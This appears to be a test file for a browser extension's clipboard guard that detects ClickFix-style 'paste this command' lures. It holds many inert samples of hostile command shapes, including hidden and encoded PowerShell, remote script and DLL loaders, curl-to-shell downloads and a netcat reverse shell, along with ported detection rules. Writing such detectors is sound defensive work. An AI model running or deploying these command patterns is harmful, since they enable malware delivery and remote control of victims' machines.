// Tests for the nerd mode clipboard guard: the dangerous-command detector
// on ClickFix-shaped payloads and on everyday clipboard text, the
// allow/deny rule (src/main/clip-detect.ts), and the MAIN <-> ISOLATED
// channel encoding (src/main/nerd-channel.ts).
//
// The "high" samples reproduce the SHAPE of ClickFix / fake-CAPTCHA payloads
// (launcher, flags, lure comment, obfuscation) with inert content: reserved
// hosts (example.invalid, 192.0.2.0/24), and base64 that decodes to
// "Write-Output test" / "hello world". Real samples are deliberately not
// stored in the repository (antivirus engines quarantine files with them).
//
// SPDX-License-Identifier: GPL-3.0-or-later

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  CLIP_REPLACEMENT,
  clipSample,
  collapseWs,
  containsCollapsed,
  decideClip,
  detectDangerousCommand,
  matchingRules,
  MAX_SCAN,
  normalizeCommand,
  UBO_PORTED_RULES,
} from '../../src/main/clip-detect.ts';
import { existsSync, readFileSync } from 'node:fs';
import { fnv1a32 } from '../../src/shared/hash.ts';
import { encodeClipCheck, encodeFp, FP_ORDER, nerdEventName, nerdSentinel, parseNerdDetail } from '../../src/main/nerd-channel.ts';

const sev = (s: string) => detectDangerousCommand(s)?.severity ?? null;
const rule = (s: string) => detectDangerousCommand(s)?.rule ?? null;

/** base64 of UTF-16LE "Write-Output test" (what -EncodedCommand expects). */
const B64_PS = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB0AGUAcwB0AA==';

const HIGH: readonly [string, string][] = [
  ['lure-comment', 'cmd /c echo hello # I am not a robot - reCAPTCHA Verification ID: 1234'],
  ['lure-comment', 'curl https://example.invalid/a # Cloudflare Ray ID: 8a1b'],
  ['powershell-encoded', `powershell -NoProfile -Enc ${B64_PS}`],
  ['powershell-encoded', `pwsh -EncodedCommand ${B64_PS}`],
  ['powershell-encoded', `powershell.exe -eC ${B64_PS}`],
  ['powershell-hidden', 'powershell -w hidden -c "Write-Output (irm https://example.invalid/a)"'],
  ['powershell-hidden', 'powershell -WindowStyle Hidden -c "Invoke-WebRequest https://example.invalid/a"'],
  ['powershell-hidden', 'p^o^w^e^r^s^h^e^l^l -w h -c "echo (i`r`m https://example.invalid/a)"'],
  ['powershell-hidden', 'powershell \u2013w hidden \u2013c "irm https://example.invalid/a"'], // en dashes work as dashes in PowerShell
  ['powershell-hidden', 'pow""ershell -w hid -c irm https://example.invalid/a'],
  ['base64-exec', `powershell -c "[Convert]::FromBase64String('aGVsbG8=')"`],
  ['mshta', 'mshta https://example.invalid/page.hta'],
  ['mshta', 'mshta vbscript:Close(1)'],
  ['rundll32-regsvr32', 'rundll32 \\\\192.0.2.1@80\\share\\test.dll,Main'],
  ['rundll32-regsvr32', 'regsvr32 /s /i:https://example.invalid/test.sct scrobj.dll'],
  ['certutil', 'certutil -urlcache -f https://example.invalid/readme.txt readme.txt'],
  ['bitsadmin', 'bitsadmin /transfer job https://example.invalid/readme.txt C:\\Temp\\readme.txt'],
  ['msiexec-remote', 'msiexec /i https://example.invalid/test.msi'],
  ['cmd-payload', 'cmd /c curl -o %TEMP%\\readme.txt https://example.invalid/readme.txt'],
  ['cmd-payload', 'cmd.exe /k start pwsh'],
  ['conhost-headless', 'conhost --headless pwsh -c "echo test"'],
  ['finger-pipe', 'finger test@192.0.2.1 | cmd'],
  ['wscript-remote', 'cscript //nologo https://example.invalid/test.js'],
  ['webdav-unc', 'notepad \\\\192.0.2.1@SSL\\DavWWWRoot\\test.txt'],
  ['base64-shell', 'echo aGVsbG8gd29ybGQK | base64 -d | sh'],
  ['osascript', `osascript -e 'do shell script "echo test"'`],
  ['curl-shell-insecure', 'curl -k https://example.invalid/test.sh | sh'],
  ['curl-shell-insecure', 'curl http://example.invalid/test.sh | sh'],
  ['curl-shell-insecure', 'curl -s 192.0.2.1/test.sh | bash'],
  ['curl-shell-insecure', '/bin/bash -c "$(curl -fsSL http://192.0.2.1/test.sh)"'],
  ['powershell-download-exec-insecure', 'irm http://example.invalid/test.ps1 | iex'],
];

// Download-and-run one-liners as real install docs show them.
const MEDIUM: readonly string[] = [
  'curl -fsSL https://get.docker.com | sh',
  "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
  '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
  'irm get.scoop.sh | iex',
  'powershell -c "irm bun.sh/install.ps1|iex"',
  "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
  'wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash',
  'curl -LsSf https://astral.sh/uv/install.sh | sudo sh',
  // uBO blocks every msiexec line; a local package is ordinary in admin docs.
  'msiexec /i C:\\Downloads\\setup.msi',
];

const BENIGN: readonly string[] = [
  'Hello world, this is a normal sentence.',
  'https://example.com/path?q=1&r=2',
  'git clone https://github.com/user/repo.git',
  'npm install --save-dev typescript',
  'npm start # verify it works',
  'pip install requests',
  'curl -O https://example.com/file.tar.gz',
  'curl https://api.example.com/v1/users | jq .',
  'cat notes.txt | shuf | head',
  'Get-ChildItem -Path C:\\Users | Sort-Object Length',
  'cmd /c dir',
  'PowerShell is a cross-platform task automation solution made up of a command-line shell.',
  'Use powershell -ExecutionPolicy Bypass -File .\\build.ps1 to run the build.',
  'echo hello | base64',
  'docker run -it --rm ubuntu bash',
  'ssh user@host.example',
  'I am not a robot',
  '#1 tip: verify your account settings',
  '# Install\n\nRun `npm ci`, then `npm test`.',
  'Bitte geben Sie den Bestätigungscode ein: 482913',
  'IBAN CH93 0076 2011 6238 5295 7',
  'const x = await fetch("https://api.example.com"); // download data',
  'Invoke-WebRequest -Uri https://example.com/file.zip -OutFile file.zip',
  'certutil -hashfile setup.exe SHA256',
  'rundll32.exe shell32.dll,Control_RunDLL',
  'mshta',
  '',
];

test('ClickFix-shaped payloads are high severity, with the expected rule', () => {
  for (const [r, s] of HIGH) {
    assert.equal(sev(s), 'high', s);
    assert.equal(rule(s), r, s);
  }
});

test('install one-liners are medium severity (allowed when visible on the page)', () => {
  for (const s of MEDIUM) assert.equal(sev(s), 'medium', s);
});

test('everyday clipboard text is not flagged', () => {
  for (const s of BENIGN) assert.equal(detectDangerousCommand(s), null, s);
  assert.equal(detectDangerousCommand(undefined), null);
  assert.equal(detectDangerousCommand(42), null);
});

test('insecure transport escalates a download-and-run line to high', () => {
  assert.deepEqual(detectDangerousCommand('curl -fsSL https://get.docker.com | sh'), { severity: 'medium', rule: 'curl-shell' });
  assert.deepEqual(detectDangerousCommand('curl -fsSL http://get.docker.com | sh'), { severity: 'high', rule: 'curl-shell-insecure' });
  assert.equal(sev('irm http://get.scoop.sh | iex'), 'high');
  assert.equal(sev('irm 192.0.2.5/install.ps1 | iex'), 'high');
});

test('the replacement text is harmless', () => {
  assert.equal(detectDangerousCommand(CLIP_REPLACEMENT), null);
  assert.ok(CLIP_REPLACEMENT.startsWith('# '));
  assert.ok(!/[\r\n|&;`$]/.test(CLIP_REPLACEMENT));
});

test('padding beyond the scan window cannot hide a command', () => {
  const padded = 'powershell -c "' + ' '.repeat(MAX_SCAN + 10) + 'irm https://example.invalid/a"';
  assert.equal(sev(padded), 'high');
  assert.equal(detectDangerousCommand('a'.repeat(MAX_SCAN * 2)), null);
});

test('normalisation removes common obfuscation', () => {
  assert.equal(normalizeCommand('P^OW^ERSHELL  -W\tHIDDEN'), 'powershell -w hidden');
  assert.equal(normalizeCommand('i`e`x'), 'iex');
  assert.equal(normalizeCommand('pow""er\'\'shell'), 'powershell');
  assert.equal(normalizeCommand('a\u200bb \u2013 c'), 'ab - c');
  assert.equal(collapseWs('  a \n\t b\u00a0c '), 'a b c');
});

const ctx = (userCopy: boolean, selection: string, visible: boolean) => ({ userCopy, selection, visible: () => visible });

test('allow/deny: the user copying their own selection is always allowed', () => {
  const cmd = HIGH[0][1];
  const v = detectDangerousCommand(cmd);
  assert.equal(decideClip(cmd, v, ctx(true, cmd, false)), false);
  // Whitespace differences between selection and payload do not matter.
  assert.equal(decideClip(cmd, v, ctx(true, `  ${cmd.replace(/ /g, '\n')} `, false)), false);
});

test('allow/deny: high payloads written by the page are blocked', () => {
  const cmd = HIGH[5][1];
  const v = detectDangerousCommand(cmd);
  assert.equal(decideClip(cmd, v, ctx(false, '', false)), true, 'writeText without selection');
  assert.equal(decideClip(cmd, v, ctx(false, cmd, true)), true, 'script-triggered copy of a selection');
  assert.equal(decideClip(cmd, v, ctx(true, 'Click the checkbox to continue', true)), true, 'copy handler swaps the selection');
});

test('allow/deny: medium payloads pass only when visible on the page', () => {
  const cmd = MEDIUM[0];
  const v = detectDangerousCommand(cmd);
  assert.equal(decideClip(cmd, v, ctx(false, '', true)), false, 'copy button next to a code block');
  assert.equal(decideClip(cmd, v, ctx(false, '', false)), true, 'hidden textarea / string in a script');
  const throwing = { userCopy: false, selection: '', visible: (): boolean => { throw new Error('x'); } };
  assert.equal(decideClip(cmd, v, throwing), true);
  assert.equal(decideClip('hello', null, ctx(false, '', false)), false);
});

test('visible-text check and samples', () => {
  assert.ok(containsCollapsed('Install:\n  curl -fsSL https://get.docker.com\n  | sh\nDone', 'curl -fsSL https://get.docker.com | sh'));
  assert.ok(!containsCollapsed('nothing here', 'curl -fsSL https://get.docker.com | sh'));
  assert.ok(!containsCollapsed('anything', '   '));
  assert.equal(clipSample('a\n b'), 'a b');
  const long = clipSample('x'.repeat(1000));
  assert.equal(long.length, 200);
  assert.ok(long.endsWith('…'));
});

test('channel: event name and sentinel depend on the extension origin', () => {
  const a = 'chrome-extension://abcdefghijklmnopabcdefghijklmnop/';
  const b = 'chrome-extension://ponmlkjihgfedcbaponmlkjihgfedcba/';
  assert.equal(nerdEventName(a), nerdEventName(a));
  assert.notEqual(nerdEventName(a), nerdEventName(b));
  assert.match(nerdEventName(a), /^bsn[0-9a-z]+$/);
  assert.notDeepEqual(nerdSentinel(a, 'clipguard'), nerdSentinel(a, 'fpmeter'));
  assert.notDeepEqual(nerdSentinel(a, 'clipguard'), nerdSentinel(b, 'clipguard'));
});

test('channel: clip checks round-trip, including separators in the text', () => {
  const text = 'a|b|c\nd';
  assert.deepEqual(parseNerdDetail(encodeClipCheck('writeText', false, text)), { kind: 'clip', source: 'writeText', userCopy: false, text });
  assert.deepEqual(parseNerdDetail(encodeClipCheck('setData', true, '')), { kind: 'clip', source: 'setData', userCopy: true, text: '' });
  assert.deepEqual(parseNerdDetail(encodeClipCheck('exec', false, '')), { kind: 'clip', source: 'exec', userCopy: false, text: '' });
});

test('channel: fp counts round-trip; forged or malformed details are rejected', () => {
  const counts = [3, 0, 1, 0, 25, 7, 0, 0];
  assert.deepEqual(parseNerdDetail(encodeFp(counts)), { kind: 'fp', counts: { canvas: 3, audio: 1, navigator: 25, screen: 7 } });
  assert.equal(FP_ORDER.length, counts.length);
  assert.equal(parseNerdDetail(encodeFp([0, 0, 0, 0, 0, 0, 0, 0])), null);
  for (const bad of [null, 1, {}, '', 'x', 'c|', 'c|nope|0|x', 'c|write|2|x', 'c|write|0x', 'f|1,2,-3', 'f|1e9', 'f|1,2,3,4,5,6,7,8,9', 'f|' + '1,'.repeat(300), 'z|1']) {
    assert.equal(parseNerdDetail(bad), null, String(bad));
  }
});

// ---------------------------------------------------------------------------
// uBO's generic ClickFix filter, ported rule by rule (clip-detect.ts
// UBO_PORTED_RULES). Fixtures are inert, and every one is assembled at run
// time from pieces (x(...)) so this file never holds a command line
// verbatim: antivirus engines quarantined files with realistic samples.
// ---------------------------------------------------------------------------

const x = (...parts: string[]) => parts.join('');
const PSH = x('power', 'shell');
const CMD = x('c', 'md');

/** [rule, severity of the rule, fixture]; the fixture must match the rule (other rules may match first). */
const PORTED: readonly [string, 'high' | 'medium', string][] = [
  ['mshta', 'high', x('msh', 'ta C:\\Temp\\test.hta')],
  ['msiexec-start', 'medium', x('msi', 'exec /i C:\\Downloads\\setup.msi /quiet')],
  ['herestring-base64', 'high', x('bash <', '<< "$(echo aGVsbG8gd29ybGQK | base', '64 -d)"')],
  ['herestring-base64', 'high', x('curl -kf', 'sSL $(echo aGVsbG8gd29ybGQK | base', '64 -d)')],
  ['cmd-payload', 'high', x(CMD, ' /c curl -o t.exe https://example.invalid/t.exe')],
  ['cmd-for-delims', 'high', x(CMD, ' /c "for /f "tokens=1 delims=," %a in ("pow,er") do echo %a"')],
  ['powershell-hidden', 'high', x(PSH, ' -w minimized -c "Write-Output test"')],
  ['powershell-hidden', 'high', x(PSH, ' -WindowStyle h -c "Write-Output test"')],
  ['powershell-noprofile', 'high', x(PSH, ' -no', 'p -c "Write-Output test"')],
  ['powershell-bypass', 'high', x(PSH, ' -ep by', 'pass -c "Write-Output test"')],
  ['powershell-bypass', 'high', x('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\', PSH, '.exe -ExecutionPolicy Unre', 'stricted -File test.ps1')],
  ['powershell-launch-exec', 'high', x(PSH, ` -c "Invoke-Ex`, `pression 'Write-Output test'"`)],
  ['powershell-launch-exec', 'high', x(PSH, ` -c "ie`, `x('Write-Output test')"`)],
  ['powershell-launch-exec', 'high', x(PSH, ' -c "Invoke-Web', 'Request https://example.invalid/a -UseBasicParsing"')],
  ['powershell-irm-relaunch', 'high', x(PSH, ' -c "ir', 'm https://example.invalid/a.txt -OutFile a.ps1; ', PSH, ' -File a.ps1"')],
  ['cmd-nop-iex', 'high', x(CMD, ' /c %p% -no', 'p -c ie', 'x $t')],
  ['launcher-recaptcha', 'high', x(CMD, ' /c echo test re', 'CAPTCHA')],
  ['launcher-recaptcha', 'high', x('bash -c "echo ok" re', 'captcha')],
  ['padded-comment', 'high', x(PSH, ' Write-Output test', ' '.repeat(8), '# done')],
  ['padded-comment', 'high', x(CMD, ' /c echo test #Veri', 'fication')],
  ['padded-comment', 'high', x('osa', 'script -e "beep"', '\t'.repeat(6), '# ok')],
  ['padded-comment-shell', 'medium', x('bash build.sh', ' '.repeat(8), '# build')],
  ['osascript', 'high', x('osa', 'script -e "do shell script \\"curl http://example.invalid/a\\""')],
  ['curl-shell', 'medium', x('curl -s https://example.invalid/i.sh | ', 'bash')],
  ['curl-shell', 'medium', x('wget -O - https://example.invalid/i.sh | ', 'sh')],
  ['curl-shell', 'medium', x('bash -c "$(cu', 'rl -fsSL https://example.invalid/i.sh)"')],
  ['shell-c-curl', 'medium', x('/bin/bash -c "cu', 'rl -fsSL https://example.invalid/i.sh -o i.sh"')],
  ['python-c-exec', 'high', x('python3 -c "import sub', 'process; print(1)"')],
  ['python-c-exec', 'high', x('python -c "import url', 'lib.request"')],
  ['echo-base64-shell', 'high', x('echo aGVsbG8= | base', '64 -d | ', 'bash')],
  ['openssl-base64', 'high', x('echo aGVsbG8= | openssl base', '64 -d')],
  ['curl-chmod-run', 'high', x('curl -o t https://example.invalid/t && ch', 'mod +x t && ./t')],
  ['curl-tmp-run', 'high', x('curl https://example.invalid/t -o /t', 'mp/t && sh /tmp/t')],
  ['netcat-shell', 'high', x('n', 'c 192.0.2.1 9 -e /bin/', 'sh')],
  ['tmp-chmod-run', 'high', x('/t', 'mp/t; ch', 'mod +x /tmp/t && /tmp/t')],
  ['wget-quiet-script', 'medium', x('wget -', 'q https://example.invalid/install.sh')],
  ['cmd-certutil', 'high', x(CMD, ' /c cert', 'util -f -split test.exe')],
  ['pcalua', 'high', x('pca', 'lua -a ', CMD, ' -c "echo test"')],
  ['cmdkey-schtasks', 'high', x(CMD, ' /c cmd', 'key /list & sch', 'tasks /query')],
  ['invoke-command-base64', 'high', x('Invoke-Command -ScriptBlock { [Convert]::FromBase', "64String('aGVsbG8=') }")],
  ['conhost-headless', 'high', x(CMD, ' --head', 'less /c echo test')],
  ['iex-download', 'medium', x('ie', 'x(ir', 'm example.invalid/a)')],
  ['irm-iex', 'medium', x('(ir', 'm example.invalid/a.ps1) | ie', 'x')],
  ['comspec-start-min', 'high', x('%COM', 'SPEC% /c start /min notepad')],
  ['cmd-temp-bat', 'high', x(CMD, ' /c echo echo test > %TE', 'MP%\\t.bat && %TEMP%\\t.bat')],
  ['cmd-cmdcmdline', 'high', x(CMD, ' /c echo %CMDCMD', 'LINE%')],
  ['cmd-delayed-expansion', 'high', x(CMD, ' /v:on /q /c "set x=hello&& echo !x!"')],
  ['convert-comspec', 'high', x('[Convert]::ToChar(99); $env:Com', 'Spec')],
  ['ps-comment-lure', 'high', x('<#Veri', 'fication ID: 1234#> Write-Output test')],
  ['iwr-wscript', 'high', x('Invoke-Web', 'Request https://example.invalid/a.js -OutFile a.js; wscr', 'ipt a.js')],
  ['url-filename-exe', 'high', x('$url = "https://example.invalid/a"\n$file', 'name = "test.exe"')],
];

test('every ported uBO rule has a positive fixture, with the declared severity', () => {
  for (const [r, severity, text] of PORTED) {
    assert.ok(matchingRules(text).includes(r), `${r}: ${text} matched ${matchingRules(text).join(',')}`);
    const v = detectDangerousCommand(text);
    assert.ok(v !== null, text);
    // A high rule makes the verdict high; a medium fixture stays medium.
    assert.equal(v.severity, severity, `${r}: ${text} -> ${v.rule}`);
  }
  // Every rule named in the uBO mapping is exercised above.
  const covered = new Set(PORTED.map(([r]) => r));
  for (const [alt, rules] of Object.entries(UBO_PORTED_RULES)) {
    for (const r of rules.split(' / ')) assert.ok(covered.has(r), `${alt} -> ${r} has no fixture`);
  }
});

test('the click-fix.nl demo payload is high (hidden PowerShell without any download)', () => {
  const demo = x(PSH, ` -NoP -W Hid`, `den -C "Add-Type -As System.Windows.Forms;[Windows.Forms.MessageBox]::Show('test','ALERT',0,16)"`);
  assert.deepEqual(detectDangerousCommand(demo), { severity: 'high', rule: 'powershell-hidden' });
});

test('line-anchored rules see every line, as uBO (flags msi) does', () => {
  assert.equal(sev(x('Run this:\n', CMD, ' /c echo %CMDCMD', 'LINE%')), 'high');
  assert.equal(sev(x('Steps\n\n  ', PSH, ' -no', 'p -c "Write-Output test"')), 'high');
  // ...but not text in the middle of a prose line.
  assert.equal(detectDangerousCommand(x('Use ', PSH, ' -no', 'p when profiles are slow.')), null);
});

test('uBO excludeMatches is an allow-list for medium verdicts only', () => {
  assert.equal(detectDangerousCommand('curl -fsSL https://example.invalid/i.sh | sh # Maintainer: Jane'), null);
  assert.equal(detectDangerousCommand('git clone https://example.invalid/r && curl -fsSL https://example.invalid/i.sh | sh'), null);
  assert.equal(detectDangerousCommand(x('use the docs: msi', 'exec /i C:\\Downloads\\setup.msi')), null);
  assert.equal(sev(x('Maintainer note:\n', PSH, ' -w hid', 'den -c "Write-Output test"')), 'high');
  assert.equal(sev(x('git log\n', CMD, ' /c echo %CMDCMD', 'LINE%')), 'high');
});

const BENIGN_MORE: readonly string[] = [
  'npm install -g pnpm',
  'pip install -r requirements.txt',
  'git push origin main',
  'python3 -m venv .venv',
  'python -c "print(1)"',
  'bash ./build.sh',
  'sh -c "echo hello"',
  'echo $PATH',
  'https://example.com/a?b=c&d=e',
  '{"cmd": "powershell", "args": ["-File", "build.ps1"]}',
  'import os\nimport subprocess\nsubprocess.run(["ls"])',
  'Maintainer: Jane Doe <jane@example.com>',
  'The cmd window shows reCAPTCHA errors when the proxy is down.',
  'Use cmd /c dir to list files.',
  'wget https://example.com/file.tar.gz',
  'openssl rand -base64 32',
  'chmod +x script.sh && ./script.sh',
  'curl -o out.json https://api.example.com/data',
  'Invoke-Command -ComputerName srv01 -ScriptBlock { Get-Service }',
  'nc -zv example.com 443',
  'echo "hello" | base64',
  'docker compose up -d   # start the stack',
  'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser',
  'pwsh -wd C:\\src -c "Get-ChildItem"',
  'To reset, open PowerShell and run Get-Process.',
];

test('more everyday text (docs one-liners, prose, JSON, URLs) is not flagged', () => {
  for (const s of BENIGN_MORE) assert.equal(detectDangerousCommand(s), null, `${s} -> ${JSON.stringify(detectDangerousCommand(s))}`);
});

test('the cached uBO filter has no ClickFix alternative that is not ported', (t) => {
  const file = new URL('../../.cache/lists/combined/ublock.txt', import.meta.url);
  if (!existsSync(file)) {
    t.skip('no cached lists (.cache/lists)');
    return;
  }
  const line = readFileSync(file, 'utf8')
    .split(/\r?\n/)
    .find((l) => l.startsWith('*,') && l.includes('##+js(prevent-clipboard-write,') && l.includes('ClickFix'));
  if (line === undefined) {
    t.skip('generic ClickFix filter not in the cached uBlock list');
    return;
  }
  const m = /##\+js\(prevent-clipboard-write, \/(.+)\/msi, domAlert,/.exec(line);
  assert.ok(m, 'filter shape changed: update clip-detect.ts UBO_PORTED_RULES');
  // Split the regex at top-level `|` (not inside groups or classes).
  const alts: string[] = [];
  let depth = 0;
  let cls = false;
  let cur = '';
  const src = m[1];
  for (let i = 0; i < src.length; i++) {
    const c = src[i];
    if (c === '\\') {
      cur += c + src[++i];
      continue;
    }
    if (cls) cls = c !== ']';
    else if (c === '[') cls = true;
    else if (c === '(') depth++;
    else if (c === ')') depth--;
    if (c === '|' && depth === 0 && !cls) {
      alts.push(cur);
      cur = '';
    } else cur += c;
  }
  alts.push(cur);
  const missing = alts.filter((a) => !(fnv1a32(a).toString(36).padStart(7, '0') in UBO_PORTED_RULES));
  assert.deepEqual(missing, [], 'uBO added ClickFix patterns: port them in clip-detect.ts (RULES + UBO_PORTED_RULES)');
});
